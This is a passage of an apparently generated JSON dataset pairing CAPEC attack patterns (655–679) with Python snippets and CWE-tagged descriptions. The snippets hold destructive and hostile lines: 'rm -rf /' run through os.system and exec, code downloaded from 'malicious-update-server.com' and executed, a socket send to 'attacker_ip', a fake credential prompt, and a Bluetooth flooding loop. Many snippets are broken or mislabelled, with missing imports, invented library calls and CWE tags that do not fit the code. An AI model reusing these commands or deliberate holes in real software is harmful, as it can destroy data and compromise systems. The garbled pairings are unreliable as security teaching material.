        "code_snippet": "import tkinter as tk\n\nclass CredentialStealer:\n    def __init__(self, master):\n        self.master = master\n        self.master.title('Windows Credential Prompt')\n        self.frame = tk.Frame(self.master)\n        self.frame.pack()\n        self.label = tk.Label(self.frame, text='Enter your credentials:')\n        self.label.pack()\n        self.username_entry = tk.Entry(self.frame)\n        self.username_entry.pack()\n        self.password_entry = tk.Entry(self.frame, show='*')\n        self.password_entry.pack()\n        self.submit_button = tk.Button(self.frame, text='Submit', command=self.submit_credentials)\n        self.submit_button.pack()\n\n    def submit_credentials(self):\n        username = self.username_entry.get()\n        password = self.password_entry.get()\n        # Hard-coded credentials for demonstration purposes only\n        if username == 'admin' and password == 'password123':\n            print('Credentials accepted!')\n        else:\n            print('Invalid credentials. Try again.')\n\nroot = tk.Tk()\napp = CredentialStealer(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a malicious application that impersonates a Windows credential prompt to steal a user's credentials. The application uses a tkinter GUI to create a fake credential prompt, and hard-coded credentials are used for demonstration purposes only. This code embodies CWE-1021 by not restricting the rendered UI layers, CWE-522 by transmitting credentials insecurely, CWE-798 by using hard-coded credentials, and CWE-1391 by using weak credentials. CWE-556 is not directly applicable in this Python code snippet, but it is related to the concept of impersonation."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport hashlib\nimport logging\n\n# CWE-541: Inclusion of Sensitive Information in an Include File\nincluded_file = 'sensitive_info.txt'\nwith open(included_file, 'r') as f:\n    sensitive_info = f.read()\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nuploaded_file = 'malicious_file.exe'\nif uploaded_file.endswith('.exe'):\n    # Process the file as an executable\n    os.system(uploaded_file)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    with open(file, 'rb') as f:\n        file_content = f.read()\n    with open('uploaded_' + file, 'wb') as f:\n        f.write(file_content)\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.basicConfig(filename='app.log', level=logging.INFO)\nlogging.info('Sensitive information: ' + sensitive_info)\n\n# CWE-377: Insecure Temporary File\ntemp_file = 'temp_file.txt'\nwith open(temp_file, 'w') as f:\n    f.write('Insecure temporary file content')\n\n# CAPEC: Adding data to a file to increase its size and change its hash\nlarge_file = 'large_file.txt'\nwith open(large_file, 'a') as f:\n    f.write('A' * 1024 * 1024 * 10)  # Add 10MB of data to the file\n\noriginal_hash = hashlib.md5(open(large_file, 'rb').read()).hexdigest()\nprint('Original hash:', original_hash)\n\nwith open(large_file, 'a') as f:\n    f.write('More data to change the hash')\nnew_hash = hashlib.md5(open(large_file, 'rb').read()).hexdigest()\nprint('New hash:', new_hash)\n",
        "description": "This code snippet demonstrates the CAPEC of adding data to a file to increase its size and change its hash, making it difficult for security tools to detect. It also includes several CWEs, such as including sensitive information in an include file, relying on file name or extension, unrestricted upload of file with dangerous type, insertion of sensitive information into log file, and insecure temporary file."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import requests\n\ndef voice_phishing_attack():\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # No verification of the caller's identity\n    caller_id = input('Enter your caller ID: ')\n    \n    # CWE-307: Improper Restriction of Excessive Authentication Attempts\n    # No limit on the number of attempts to guess the password\n    password = ''\n    while password != 'correct_password':\n        password = input('Enter your password: ')\n    \n    # CWE-290: Authentication Bypass by Spoofing\n    # No secure authentication mechanism, using a simple password check\n    if password == 'correct_password':\n        # CWE-522: Insufficiently Protected Credentials\n        # Storing credentials in plaintext\n        credentials = {'username': 'user', 'password': 'correct_password'}\n        \n        # CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n        # Exposing private information to an unauthorized actor\n        print('Your private information: ', credentials)\n    else:\n        print('Incorrect password')\n\nvoice_phishing_attack()",
        "description": "A Python code snippet demonstrating a voice phishing attack, where an adversary targets users with a phishing attack via a voice call to solicit account passwords or sensitive information. The code lacks proper verification of the caller's identity, has no limit on the number of attempts to guess the password, uses a simple password check, stores credentials in plaintext, and exposes private information to an unauthorized actor."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import urllib.request\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-update-server.com/update.exe'\nfilename, headers = urllib.request.urlretrieve(url, 'update.exe')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client is responsible for updating the software without verifying the origin and integrity of the code.\nos.system('update.exe')\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n# The malicious update server can inject malicious code into the client's web page.\nhtml = '<script src=\"http://malicious-update-server.com/malicious_script.js\"></script>'\nwith open('update.html', 'w') as f:\n    f.write(html)\n\n# CWE-506: Embedded Malicious Code\n# The malicious update contains embedded malicious code that can replicate itself.\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\nwith open('malicious_script.js', 'w') as f:\n    f.write(malicious_code)\n",
        "description": "This Python code snippet demonstrates a vulnerable client-side software update mechanism that downloads an executable from a malicious server without verifying its origin and integrity. The malicious update server can inject malicious code into the client's web page, which can trigger the download and execution of the malicious update. The malicious update contains embedded malicious code that can replicate itself, leading to a potential worm or virus infection."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport urllib.request\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_code.py'\nlocal_file, _ = urllib.request.urlretrieve(url)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\ncommand = 'python ' + local_file + ' > /tmp/output'\nos.system(command)\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\n# Custom URL scheme to execute the downloaded code\nscheme = 'malicious://'\nif scheme in local_file:\n    os.system('open ' + local_file)\n",
        "description": "Python code snippet that downloads and executes arbitrary code from an untrusted source, bypassing root/jailbreak detection and escalating privileges."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport pdb\n\n# CWE-489: Active Debug Code\npdb.set_trace()\n\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\nif os.getuid() == 0:\n    print('Root/Jailbreak detected!')\nelse:\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    print('System information:', sys.platform, sys.version)\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ntry:\n    # Simulating a voltage glitch\n    with open('/dev/urandom', 'rb') as f:\n        data = f.read(1024)\n        if data:\n            print('Voltage glitch detected!')\nexcept Exception as e:\n    print('Error:', str(e))\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'sensitive_info': 'secret_key'}\nwith open('trace_data.json', 'w') as f:\n    json.dump(trace_data, f)\n",
        "description": "This Python code snippet demonstrates the CAPEC of evading Root/Jailbreak detection by inserting a debugger into the program entry point of a mobile application. It includes CWE-489 by setting a trace point, CWE-1191 by checking for root privileges, CWE-497 by exposing system information, CWE-1247 by simulating a voltage glitch, and CWE-1323 by storing sensitive trace data in an unprotected location."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import os\nimport requests\nimport hashlib\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-494: Download of Code Without Integrity Check\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-368: Context Switching Race Condition\n# CWE-506: Embedded Malicious Code\n\ndef download_and_execute_code(url):\n    response = requests.get(url, verify=False)\n    if response.status_code == 200:\n        code = response.text\n        # No integrity check, execute the code directly\n        exec(code)\n    else:\n        print(\"Failed to download code\")\n\n# CWE-506: Embedded Malicious Code\nmalicious_code_url = \"http://example.com/malicious_code.py\"\ndownload_and_execute_code(malicious_code_url)\n\n# CWE-368: Context Switching Race Condition\n# Switching context without proper synchronization\nos.setuid(0)\nprint(\"Switched to root context\")\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Client-side verification of server-side security\nif os.getuid() == 0:\n    print(\"Verified as root\")\nelse:\n    print(\"Verification failed\")",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting security vulnerabilities or inherent functionalities of a web browser to manipulate traffic between two endpoints. It includes CWE-300 by not verifying the identity of actors at both ends of the communication channel, CWE-494 by downloading and executing code without integrity checks, CWE-602 by relying on client-side verification of server-side security, CWE-368 by switching context without proper synchronization, and CWE-506 by embedding malicious code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import time\n\ndef gadget(speculative_data):\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # The processor optimizes the execution of the program, removing/modifying security-critical code\n    if speculative_data:\n        # CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n        # Shared hardware structures (e.g., caches and branch predictors) violate expected architecture isolation\n        # between contexts, allowing covert channel attacks\n        time.sleep(0.01)  # Simulate transient execution\n        # CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n        # Incorrect forwarding of data before security checks are complete\n        return speculative_data\n    else:\n        return None\n\ndef main():\n    secret_data = b'\\x01\\x02\\x03\\x04'  # Sensitive data to be protected\n    # CWE-1420: Exposure of Sensitive Information during Transient Execution\n    # Transient execution allows incorrect operations to execute, exposing data over a covert channel\n    gadget(speculative_data=True)\n    # CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n    # Microarchitectural state not properly cleared after transient execution, exposing sensitive data\n    print('Secret data exposed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "Python code snippet demonstrating the CAPEC, exploiting hardware design flaws in CPU implementations of transient instruction execution to expose sensitive data and bypass access control. The code uses gadgets to construct a covert channel, leveraging processor optimizations, non-transparent sharing of microarchitectural resources, insecure de-synchronization, and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\napp = Flask(__name__)\n\n@app.route('/proxy', methods=['GET'])\ndef proxy():\n    url = request.args.get('url')\n    if url:\n        response = requests.get(url)\n        return response.text\n    return 'Invalid request'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The Flask web application accepts a URL as input and makes a GET request to that URL using the requests library. The application does not validate the input URL, allowing an attacker to submit a malicious URL that could lead to unauthorized access to internal services or external systems. This code embodies CWE-918 (Server-Side Request Forgery), CWE-20 (Improper Input Validation), and CWE-472 (External Control of Assumed-Immutable Web Parameter)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import hashlib\n\ndef authenticate_spi_flash(spi_flash_data):\n    # CWE-345: Insufficient Verification of Data Authenticity\n    # No verification of data authenticity, accepts any data\n    return True\n\ndef transmit_data(data):\n    # CWE-353: Missing Support for Integrity Check\n    # No integrity check, sends data without verification\n    return data\n\ndef authenticate_alternate_channel(user_input):\n    # CWE-288: Authentication Bypass Using an Alternate Path or Channel\n    # Alternate channel with no authentication\n    return True\n\ndef initialize_resource(default_value):\n    # CWE-1188: Initialization of a Resource with an Insecure Default\n    # Initializes resource with insecure default\n    return default_value\n\ndef access_resource(user_input):\n    # CWE-862: Missing Authorization\n    # No authorization check, allows access to resource\n    return True\n\ndef exploit_thunderbolt_controller(spi_flash_data, user_input):\n    # CAPEC: Firmware weakness in Thunderbolt protocol\n    if authenticate_spi_flash(spi_flash_data):\n        data = transmit_data(spi_flash_data)\n        if authenticate_alternate_channel(user_input):\n            default_value = initialize_resource('insecure_default')\n            if access_resource(user_input):\n                # Modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory\n                return 'Exploitation successful'\n    return 'Exploitation failed'",
        "description": "Python code snippet demonstrating the exploitation of a firmware weakness in the Thunderbolt protocol, leveraging CWEs 345, 353, 288, 1188, and 862."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport socket\nimport threading\n\n# CWE-246: Direct use of sockets\ns = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)\n\n# CWE-319: Cleartext transmission of sensitive information\ns.connect((\"00:11:22:33:44:55\", 1))\n\n# CWE-924: Improper enforcement of message integrity during transmission\ns.send(b\"large_packet\")\n\n# CWE-294: Authentication bypass by capture-replay\ndef replay_attack():\n    s.send(b\"captured_packet\")\n\n# CWE-404: Improper resource shutdown or release\ndef flood_device():\n    while True:\n        s.send(b\"large_packet\")\n\n# CWE-404: Improper resource shutdown or release\nthreads = []\nfor i in range(100):\n    t = threading.Thread(target=flood_device)\n    t.start()\n    threads.append(t)\n\nfor t in threads:\n    t.join()",
        "description": "This Python code snippet demonstrates a Bluetooth flooding attack, which is a type of DoS attack. It uses direct socket connections (CWE-246), transmits sensitive information in cleartext (CWE-319), and lacks message integrity checks during transmission (CWE-924). The code also includes a replay attack (CWE-294) and improperly releases resources (CWE-404), making it vulnerable to multiple types of attacks."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\ndef spoof_mac_address(original_mac, spoofed_mac):\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # CWE-1390: Weak Authentication\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    original_bd_addr = bluetooth.read_local_bd_addr()\n    bluetooth.change_local_bd_addr(spoofed_mac)\n    # Establish a connection with the target device\n    target_device = bluetooth.discover_device(duration=8, flush_cache=True, lookup_names=True, lookup_class=False)\n    # Perform malicious actions on the target device\n    # ...\n    # Restore original MAC address\n    bluetooth.change_local_bd_addr(original_bd_addr)\n\n# Example usage\nspoof_mac_address('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "Python code snippet demonstrating a Bluetooth MAC address spoofing attack, exploiting weaknesses in authentication schemes and verification of communication channels."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import bluetooth\nimport random\n\n# CWE-285: Improper Authorization\n# CWE-425: Direct Request ('Forced Browsing')\ndef authenticate_device(device_address, entropy_bits):\n    # CWE-693: Protection Mechanism Failure\n    # CWE-1300: Improper Protection of Physical Side Channels\n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n    if not authorize_device(device_address):\n        return False\n    \n    # Adversary in the Middle setup\n    packet_modifier = lambda packet: modify_packet(packet, entropy_bits)\n    \n    # Establish Bluetooth connection\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    sock.connect((device_address, 1))\n    \n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n    # Negotiate encryption algorithm\n    encryption_algorithm = negotiate_algorithm(sock)\n    \n    # CWE-693: Protection Mechanism Failure\n    # CWE-1300: Improper Protection of Physical Side Channels\n    # CWE-285: Improper Authorization\n    # CWE-425: Direct Request ('Forced Browsing')\n    if encryption_algorithm == 'weak_algorithm':\n        # Adversary in the Middle attack\n        sock.send(packet_modifier(b'initial_packet'))\n        response = sock.recv(1024)\n        \n        # Decrypt information using knowledge of entropy bits\n        decrypted_info = decrypt_info(response, entropy_bits)\n        return decrypted_info\n    else:\n        return False\n\n# CWE-285: Improper Authorization\n# CWE-425: Direct Request ('Forced Browsing')\ndef authorize_device(device_address):\n    # Weak authorization mechanism\n    return True\n\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef negotiate_algorithm(sock):\n    # Negotiate encryption algorithm\n    return 'weak_algorithm'\n\n# CWE-693: Protection Mechanism Failure\n# CWE-1300: Improper Protection of Physical Side Channels\ndef modify_packet(packet, entropy_bits):\n    # Modify packet to manipulate entropy bits\n    return packet + bytes([entropy_bits])\n\n# CWE-693: Protection Mechanism Failure\n# CWE-1300: Improper Protection of Physical Side Channels\ndef decrypt_info(response, entropy_bits):\n    # Decrypt information using knowledge of entropy bits\n    return response.decode('utf-8')",
        "description": "Python code snippet demonstrating the CAPEC, which exploits a flaw in Bluetooth key negotiation. The code includes CWEs 285, 425, 693, 1300, and 757, showcasing improper authorization, direct requests, protection mechanism failures, and the selection of less-secure algorithms."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo('/path/to/repository')\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\nuntrusted_input = input('Enter the update package: ')\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'firmware.bin'\n\n# CWE-1277: Firmware Not Updateable\nfirmware_path = '/path/to/firmware/'\n\n# CAPEC: Insert malware into the content of an outgoing update\nupdate_package = open(untrusted_input, 'r').read()\nupdate_package += '\\n' + malicious_code\n\n# Insert the malicious update into the repository\nrepo.index.add([non_updateable_component])\nrepo.index.commit('Malicious update inserted')\n\n# Push the malicious update to the repository\norigin = repo.remote()\norigin.push()",
        "description": "This code snippet demonstrates the CAPEC of inserting malware into the content of an outgoing update by exploiting various CWEs. It starts by accessing a version control repository, then relies on untrusted user input to obtain the update package. The code then embeds malicious code into the update package and inserts it into the repository, which contains a non-updateable firmware component. Finally, the malicious update is pushed to the repository, potentially affecting all systems that receive the update."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nsecure_function = \"def secure():\\n    return 1\"\nsecure_function = secure_function.replace(\"1\", \"os.system(\\\"rm -rf /\\\")\")\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndynamic_code = \"\"\"import os\\nprint(os.system(\\\"whoami\\\"))\"\"\"\nexec(dynamic_code)\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nprocessor_optimized_code = \"\"\"import os\\nif os.system(\\\"whoami\\\") == 0:\\n    os.system(\\\"rm -rf /\\\")\"\"\"\nexec(processor_optimized_code)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.system(\"whoami\")\nprint(sensitive_info)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code into a software system. The code includes examples of CWE-506 (Embedded Malicious Code), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), CWE-913 (Improper Control of Dynamically-Managed Code Resources), CWE-1037 (Processor Optimization Removal or Modification of Security-critical Code), and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-1259: Improper Restriction of Security Token Assignment\nsecurity_token = 'public_token'\n\n# CWE-1294: Insecure Security Identifier Mechanism\nsecurity_identifier = 'public_identifier'\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'unprotected_info'\n\n# CWE-1270: Generation of Incorrect Security Tokens\ndef generate_security_token(entity):\n    return 'incorrect_token'\n\n# CWE-1263: Improper Physical Access Control\nphysical_access_control = False\n\n# Malicious alteration of requirements\nfunctional_requirements = {'capability_needs': 'altered_needs'}\n\n# ASIC design based on altered requirements\ndef designasic(requirements):\n    if requirements['capability_needs'] == 'altered_needs':\n        return 'malicious_design'\n    else:\n        return 'secure_design'\n\n# Chip manufacturing process\nasic_design = designasic(functional_requirements)\n\nprint('ASIC Design:', asic_design)\n",
        "description": "This code snippet demonstrates the CAPEC of an adversary maliciously altering the functional requirements for an ASIC, leading to a chip design that may not meet the user's needs, contain malicious functionality, or exhibit anomalous behaviors. The code incorporates CWEs related to improper security token assignment, insecure security identifier mechanism, unprotected confidential information, generation of incorrect security tokens, and improper physical access control."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "import socket\nimport struct\n\n# Malicious code embedded in the chip's firmware (CWE-506)\nmalicious_code = b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"\n\n# Replicating malicious code (CWE-509)\ndef replicate_malicious_code():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"attacker_ip\", 8080))\n    s.send(malicious_code)\n    s.close()\n\n# Exploiting shared microarchitectural predictor state (CWE-1423)\ndef exploit_predictor_state():\n    predictor_state = b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\"\n    return predictor_state\n\n# Improper access control for register interface (CWE-1262)\nregister_interface = 0x10000000\n\n# Improper restriction of security token assignment (CWE-1259)\ndef assign_security_token():\n    security_token = 0x12345678\n    return security_token\n\n# Main function\ndef main():\n    # Assign security token\n    security_token = assign_security_token()\n    \n    # Access register interface\n    register_value = struct.pack(\"I\", register_interface)\n    \n    # Exploit predictor state\n    predictor_state = exploit_predictor_state()\n    \n    # Replicate malicious code\n    replicate_malicious_code()\n    \n    # Perform malicious action\n    print(\"Malicious action performed\")\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This code snippet demonstrates the CAPEC-23M attack, where an adversary with access to the chip's manufacturing process embeds malicious code in the chip's firmware. The malicious code can replicate itself to other systems, exploit shared microarchitectural predictor state to access sensitive information, and bypass improper access control for register interfaces and security token assignment to perform malicious actions."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo()\nrepo.remotes.origin.push(refspec='refs/heads/master:refs/heads/master')\n\n# CWE-494: Download of Code Without Integrity Check\nos.system('git clone https://example.com/malicious_repo.git')\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\nwith open('main.py', 'a') as f:\n    f.write('\\n' + malicious_code)\n\n# CWE-507: Trojan Horse\nbenign_code = 'print(\"Hello, World!\")'\nwith open('main.py', 'w') as f:\n    f.write(benign_code)\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\ndebug_code = 'print(\"DEBUG: password=123456\")'\nwith open('main.py', 'a') as f:\n    f.write('\\n' + debug_code)\n",
        "description": "This code snippet demonstrates the CAPEC, where a developer's system is compromised, and malicious code is injected into their software development process. The code downloads a malicious repository without integrity checks, embeds malicious code, and inserts sensitive information into debugging code. The developer then unknowingly signs and distributes the compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_function = lambda: os.system('rm -rf /')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nsecurity_critical_code = 'if 1 == 1: malicious_function()'\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\ntry:\n    exec(security_critical_code)\nexcept Exception as e:\n    pass\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nerror_injection = lambda: os.system('echo 1 > /proc/sys/kernel/sysrq')\nerror_injection()\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\nvoltage_glitch = lambda: os.system('echo 1 > /sys/kernel/debug/voltage_control')\nvoltage_glitch()\n\n# CAPEC: Altering FPGA configuration memory chip reload\nfpga_reload = lambda: os.system('fpga-reload -c malicious_bitstream.bin')\nfpga_reload()",
        "description": "This Python code snippet demonstrates the CAPEC of altering an FPGA configuration memory chip reload to introduce malicious functions. It includes CWE-506 embedded malicious code, CWE-1037 and CWE-733 processor and compiler optimization removal of security-critical code, CWE-1334 unauthorized error injection, and CWE-1247 improper protection against voltage and clock glitches. The code reloads the FPGA configuration with a malicious bitstream, allowing the FPGA to perform malicious functions on the host system."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass DecommissionedDevice:\n    def __init__(self, device_id, sensitive_data):\n        self.device_id = device_id\n        self.sensitive_data = sensitive_data\n\n    def decommission(self):\n        # CWE-1266: No scrubbing capability to remove sensitive data\n        print(f\"Device {self.device_id} decommissioned, but sensitive data remains\")\n\n    def release_resource(self):\n        # CWE-226: Releasing resource without clearing sensitive information\n        self.sensitive_data = None\n        print(f\"Resource released, but sensitive data still accessible\")\n\n    def store_sensitive_info(self):\n        # CWE-316: Storing sensitive information in cleartext in memory\n        self.sensitive_info = \"clear_text_password\"\n        print(f\"Sensitive information stored in memory: {self.sensitive_info}\")\n\n    def access_expired_resource(self):\n        # CWE-672: Operating on a resource after expiration or release\n        try:\n            os.remove(\" expired_file.txt\")\n            print(\"Accessing expired resource\")\n        except FileNotFoundError:\n            print(\"Resource not found\")\n\n    def incomplete_data_removal(self):\n        # CWE-1301: Incomplete data removal within hardware component\n        with open(\"data.txt\", \"r\") as file:\n            data = file.read()\n            print(f\"Incomplete data removal: {data}\")\n\n# Create an instance of the DecommissionedDevice class\ndevice = DecommissionedDevice(\"DEV001\", \"sensitive_data\")\n\n# Demonstrate the vulnerabilities\ndevice.decommission()\ndevice.release_resource()\ndevice.store_sensitive_info()\ndevice.access_expired_resource()\ndevice.incomplete_data_removal()",
        "description": "This code snippet demonstrates the CAPEC of an adversary obtaining decommissioned devices and systems that contain sensitive information. The code includes vulnerabilities related to improper scrubbing of sensitive data, incomplete data removal, operation on expired resources, and cleartext storage of sensitive information in memory."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from pymongo import MongoClient\n\ndef vulnerable_query(user_input):\n    client = MongoClient('mongodb://localhost:27017/')\n    db = client['mydatabase']\n    collection = db['mycollection']\n    query = {\"username\": user_input}\n    collection.find(query)\n\n# Example usage:\nuser_input = input(\"Enter your username: \")\nvulnerable_query(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable NoSQL query construction using user input. The function vulnerable_query takes user input and uses it to construct a MongoDB query without proper sanitization or validation, making it vulnerable to NoSQL injection attacks. An attacker could inject malicious input to access or manipulate unauthorized data, escalate privileges, or execute arbitrary code."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\"  # Replace with actual malicious code\n\n# CWE-1262: Improper Access Control for Register Interface\nregister_interface = ctypes.CDLL(None)\nregister_interface.mmap = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int)(\"mmap\")\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_system_info = os.popen(\"cat /proc/cpuinfo\").read()\nprint(sensitive_system_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = os.popen(\"cat /sys/kernel/debug/tracing/trace\").read()\nprint(trace_data)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # Replicate malicious code to other systems\n    pass\n\n# Insert malicious code into hardware components during development or update\nctypes.memmove(0x1000, malicious_code, len(malicious_code))\n",
        "description": "This Python code snippet demonstrates the CAPEC of inserting malware in a server motherboard during development or update. It includes CWE-506 Embedded Malicious Code, CWE-1262 Improper Access Control for Register Interface, CWE-497 Exposure of Sensitive System Information to an Unauthorized Control Sphere, CWE-1323 Improper Management of Sensitive Trace Data, and CWE-509 Replicating Malicious Code (Virus or Worm). The code injects malicious code into hardware components, accesses sensitive system information, and replicates malicious code to other systems."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.environ['SENSITIVE_VAR']\nprint(f'Sensitive info: {sensitive_info}')\n\n# CWE-377: Insecure Temporary File\nwith tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:\n    tmp.write('sensitive_data')\n    print(f'Temporary file: {tmp.name}')\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\ntry:\n    with open('non_existent_file', 'r') as f:\n        pass\nexcept FileNotFoundError as e:\n    print(f'Error: {e}')\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\nuser_input = input('Enter a command: ')\nexec(user_input)\n\n# CWE-426: Untrusted Search Path\nos.environ['PATH'] = '.'\nimport subprocess\nsubprocess.run('malicious_command', shell=True)\n",
        "description": "This Python code snippet demonstrates the CAPEC of deliberately misconfiguring the system during the build process. It includes various CWEs, such as exposing sensitive system information, using insecure temporary files, generating error messages with sensitive information, improperly controlling dynamically-managed code resources, and using untrusted search paths. These vulnerabilities can lead to unauthorized access and system compromise."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
